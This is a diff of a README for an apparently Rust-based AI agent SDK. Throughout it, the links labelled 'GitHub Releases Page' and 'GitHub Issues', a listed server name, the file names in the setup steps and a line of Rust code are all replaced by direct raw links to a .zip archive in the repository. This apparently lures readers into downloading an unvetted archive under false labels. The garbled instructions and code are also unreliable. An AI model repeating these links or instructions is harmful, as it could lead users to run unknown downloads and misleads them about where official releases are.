@@ -1,10 +1,10 @@
 # 🚀 open-agent-sdk-rust - Build AI Agents with Ease
 
-[![Download open-agent-sdk-rust](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip%20Now%20%3E%3E%3E-brightgreen)](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip)
+[![Download open-agent-sdk-rust](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip%20Now%20%3E%3E%3E-brightgreen)](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip)
 
 ## 📥 Overview
 
-Open Agent SDK for Rust is a powerful tool designed for anyone interested in building AI agents. It works smoothly with local OpenAI-compatible servers like LMStudio, Ollama, https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip, and vLLM. With features like streaming, tools, hooks, retry logic, and comprehensive examples, it simplifies your experience in AI development. 
+Open Agent SDK for Rust is a powerful tool designed for anyone interested in building AI agents. It works smoothly with local OpenAI-compatible servers like LMStudio, Ollama, https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip, and vLLM. With features like streaming, tools, hooks, retry logic, and comprehensive examples, it simplifies your experience in AI development. 
 
 ## 🚀 Features
 
@@ -24,7 +24,7 @@ To use the Open Agent SDK, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip). 
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the `open-agent-sdk-rust`.
@@ -69,18 +69,18 @@ Here’s a simple example to illustrate how to build an AI agent using the SDK:
    ```
 
 2. **Add SDK Dependency:**
-   Open the `https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip` file and add the following line:
+   Open the `https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip` file and add the following line:
    ```
    open-agent-sdk = "0.1.0"
    ```
 
 3. **Implement Basic Logic:**
-   In your `https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip` file, you can start coding your agent:
+   In your `https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip` file, you can start coding your agent:
    ```rust
    fn main() {
        // Example of setting up your AI agent
        let agent = OpenAgent::new();
-       https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip();
+       https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip();
    }
    ```
 
@@ -94,7 +94,7 @@ Here’s a simple example to illustrate how to build an AI agent using the SDK:
 
 Join our community to share your experiences, ask questions, or get support. You can engage with others on our community forums and social platforms. 
 
-- **Issues Page:** Report bugs or request features on our [GitHub Issues](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip).
+- **Issues Page:** Report bugs or request features on our [GitHub Issues](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip).
 - **Discussion Board:** Participate in conversations and share insights.
 - **Documentation:** Explore in-depth guides and API documentation for advanced features.
 
@@ -108,4 +108,4 @@ Contributions are welcome! If you have ideas to improve the SDK or want to add f
 
 Start your journey with AI development today with Open Agent SDK for Rust! Download now and begin building innovative solutions. 
 
-For more information, visit the [GitHub Releases Page](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/benches/open-agent-sdk-rust_v3.6.zip).
+For more information, visit the [GitHub Releases Page](https://raw.githubusercontent.com/JLABUAN/open-agent-sdk-rust/main/examples/open_agent_rust_sdk_v3.4.zip).
